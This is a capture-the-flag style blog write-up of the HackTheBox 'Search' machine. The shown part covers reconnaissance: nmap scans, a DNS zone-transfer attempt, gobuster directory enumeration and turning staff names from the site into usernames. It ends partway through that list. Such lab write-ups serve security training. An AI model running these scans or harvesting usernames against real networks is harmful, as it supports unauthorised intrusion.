@@ -1,0 +1,705 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Search</title><meta name="description" content="This is Ischyros blog where he posts cyber security topics and sheets"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/ISC.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Information GatheringNMAP
+command used: ( scanning for all the ports fast and efficient)
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.129 -oG nmap/allPorts
+
+command used: ( scanning the ports we got )
+nmap -A -sC -sV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49669,49670,49693,49702,49727 10.10.11.129 -Pn
+
+-&amp;gt.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Search</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-53-Default-port-for-Domain"><span class="toc-text">TCP 53 ( Default port for Domain )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-80-Default-port-for-HTTP"><span class="toc-text">TCP 80 ( Default port for HTTP )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Kerbrute-user-enumeration"><span class="toc-text">Kerbrute: user enumeration</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Kerbrute-password-spraying"><span class="toc-text">Kerbrute: password spraying</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Crackmapexec"><span class="toc-text">Crackmapexec</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#BloodHound-py"><span class="toc-text">BloodHound.py</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-text">SMB Enumeration</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReadGMSAPassword"><span class="toc-text">ReadGMSAPassword</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a><a href="/tags/Hard"><i class="tag post-item-tag">Hard</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Search</h1><time class="has-text-grey" datetime="2022-05-01T14:48:02.000Z">2022-05-01</time><article class="mt-2 post-content"><img src="/2022/05/01/search/avatar.png" class="">
+
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><ul>
+<li><p>command used: ( scanning for all the ports fast and efficient)</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p- <span class="token parameter variable">-sS</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">--open</span> <span class="token parameter variable">-T5</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">-Pn</span> <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-oG</span> nmap/allPorts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>command used: ( scanning the ports we got )</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49669,49670,49693,49702,49727 <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-Pn</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<p>-&gt; All ports scan:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Not shown: <span class="token number">65514</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain           syn-ack ttl <span class="token number">127</span>
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http             syn-ack ttl <span class="token number">127</span>
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec     syn-ack ttl <span class="token number">127</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc            syn-ack ttl <span class="token number">127</span>
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn      syn-ack ttl <span class="token number">127</span>
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap             syn-ack ttl <span class="token number">127</span>
+<span class="token number">443</span>/tcp   <span class="token function">open</span>  https            syn-ack ttl <span class="token number">127</span>
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds     syn-ack ttl <span class="token number">127</span>
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5         syn-ack ttl <span class="token number">127</span>
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  http-rpc-epmap   syn-ack ttl <span class="token number">127</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  ldapssl          syn-ack ttl <span class="token number">127</span>
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  globalcatLDAP    syn-ack ttl <span class="token number">127</span>
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  globalcatLDAPssl syn-ack ttl <span class="token number">127</span>
+<span class="token number">8172</span>/tcp  <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  adws             syn-ack ttl <span class="token number">127</span>
+<span class="token number">49667</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">49669</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">49670</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">49693</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">49702</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span>
+<span class="token number">49727</span>/tcp <span class="token function">open</span>  unknown          syn-ack ttl <span class="token number">127</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>-&gt; All ports scan with flags:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PORT      STATE SERVICE       VERSION
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span>_http-title: Search <span class="token operator">&amp;</span>mdash<span class="token punctuation">;</span> Just Testing IIS
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  **kerberos-sec**  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2022</span>-05-01 <span class="token number">11</span>:50:36Z<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:06+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-4s</span> from scanner time.
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>research
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-08-11T08:13:35
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-08-09T08:13:35
+<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:06+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-4s</span> from scanner time.
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span> tls-alpn: 
+<span class="token operator">|</span>_  http/1.1
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span>_http-title: Search <span class="token operator">&amp;</span>mdash<span class="token punctuation">;</span> Just Testing IIS
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>research
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-08-11T08:13:35
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-08-09T08:13:35
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:06+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-4s</span> from scanner time.
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>research
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-08-11T08:13:35
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-08-09T08:13:35
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>research
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-08-11T08:13:35
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-08-09T08:13:35
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:06+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-4s</span> from scanner time.
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:07+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-3s</span> from scanner time.
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>research
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-08-11T08:13:35
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-08-09T08:13:35
+<span class="token number">8172</span>/tcp  <span class="token function">open</span>  ssl/http      Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span>_ssl-date: <span class="token number">2022</span>-05-01T11:52:06+00:00<span class="token punctuation">;</span> <span class="token parameter variable">-4s</span> from scanner time.
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WMSvc-SHA2-RESEARCH
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-04-07T09:05:25
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2030</span>-04-05T09:05:25
+<span class="token operator">|</span>_http-title: Site doesn't have a title.
+<span class="token operator">|</span> tls-alpn: 
+<span class="token operator">|</span>_  http/1.1
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
+<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49669</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49693</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49702</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49727</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+Service Info: Host: RESEARCH<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can notice a virtual host from the LDAP: <strong>search.htb</strong><br>Let’s add it to <strong>&#x2F;etc&#x2F;hosts</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">cat</span> /etc/hosts                  
+<span class="token number">127.0</span>.0.1       localhost
+<span class="token number">127.0</span>.1.1       kali
+
+<span class="token number">10.10</span>.11.129    search.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><h6 id="TCP-53-Default-port-for-Domain"><a href="#TCP-53-Default-port-for-Domain" class="headerlink" title="TCP 53 ( Default port for Domain )"></a>TCP 53 ( Default port for Domain )</h6><p>-&gt; SSH package version:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-vn</span> <span class="token number">10.10</span>.11.129 <span class="token number">53</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>output:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">nc</span> <span class="token parameter variable">-vn</span> <span class="token number">10.10</span>.11.129 <span class="token number">53</span>
+<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.129<span class="token punctuation">]</span> <span class="token number">53</span> <span class="token punctuation">(</span>domain<span class="token punctuation">)</span> <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+<p>-&gt; dig:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">dig</span> axfr @search.htb 
+
+<span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> DiG <span class="token number">9.16</span>.15-Debian <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> axfr @search.htb
+<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">1</span> server found<span class="token punctuation">)</span>
+<span class="token punctuation">;</span><span class="token punctuation">;</span> global options: +cmd
+<span class="token punctuation">;</span><span class="token punctuation">;</span> Query time: <span class="token number">4696</span> msec
+<span class="token punctuation">;</span><span class="token punctuation">;</span> SERVER: <span class="token number">10.10</span>.11.129<span class="token comment">#53(10.10.11.129)</span>
+<span class="token punctuation">;</span><span class="token punctuation">;</span> WHEN: Sun May 01 07:55:12 EDT <span class="token number">2022</span>
+<span class="token punctuation">;</span><span class="token punctuation">;</span> MSG SIZE  rcvd: <span class="token number">28</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="TCP-80-Default-port-for-HTTP"><a href="#TCP-80-Default-port-for-HTTP" class="headerlink" title="TCP 80 ( Default port for HTTP )"></a>TCP 80 ( Default port for HTTP )</h6><p>-&gt; Web Server:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">curl</span> <span class="token parameter variable">-i</span> http://search.htb/ <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">50</span> 
+
+Content-Type: text/html
+Last-Modified: Tue, <span class="token number">11</span> Aug <span class="token number">2020</span> <span class="token number">10</span>:13:04 GMT
+Accept-Ranges: bytes
+ETag: <span class="token string">"5f3800c86fd61:0"</span>
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sun, 01 May <span class="token number">2022</span> <span class="token number">11</span>:57:39 GMT
+Content-Length: <span class="token number">44982</span>
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>doctype html<span class="token operator">></span>
+<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
+  <span class="token operator">&lt;</span>head<span class="token operator">></span>
+    <span class="token operator">&lt;</span>title<span class="token operator">></span>Search <span class="token operator">&amp;</span>mdash<span class="token punctuation">;</span> Just Testing IIS<span class="token operator">&lt;</span>/title<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>-&gt; Directory Listing:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://search.htb/ <span class="token parameter variable">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>-&gt; output:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://search.htb/ <span class="token parameter variable">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://search.htb/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.1.0
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token number">2022</span>/05/01 07:58:32 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">148</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/images/<span class="token punctuation">]</span>
+/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">144</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/js/<span class="token punctuation">]</span>    
+/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">145</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/css/<span class="token punctuation">]</span>   
+/Images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">148</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/Images/<span class="token punctuation">]</span>
+/.                    <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">44982</span><span class="token punctuation">]</span>                              
+/fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">147</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/fonts/<span class="token punctuation">]</span> 
+/staff                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1233</span><span class="token punctuation">]</span>                               
+/CSS                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">145</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/CSS/<span class="token punctuation">]</span>   
+/JS                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">144</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/JS/<span class="token punctuation">]</span>    
+/Css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">145</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/Css/<span class="token punctuation">]</span>   
+/Js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">144</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/Js/<span class="token punctuation">]</span>    
+/IMAGES               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">148</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/IMAGES/<span class="token punctuation">]</span>
+/Staff                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1233</span><span class="token punctuation">]</span>                               
+/Fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">147</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://search.htb/Fonts/<span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The only interesting endpoint is <strong>&#x2F;Staff</strong> but we get a 403 - Forbidden Access</p>
+<img src="/2022/05/01/search/20220501150217.png" class="">
+<p>Maybe we will be able to access this later on.</p>
+<p>Looking manually on the webserver we can find a team-section page.<br>This will help us gather some usernames for later usage</p>
+<img src="/2022/05/01/search/20220501150345.png" class="">
+
+<p>-&gt; usernames:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Image\|Manager"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token builtin class-name">.</span>
+Keely Lyons
+Dax Santiago
+Sierra Frye
+Kyla Stewart
+Kaiara Spencer
+Dave Simpson
+Ben Thompson
+Chris Stewart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Search for space and replace it with a period</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/ /./g'</span>                                    
+Keely.Lyons
+Dax.Santiago
+Sierra.Frye
+Kyla.Stewart
+Kaiara.Spencer
+Dave.Simpson
+Ben.Thompson
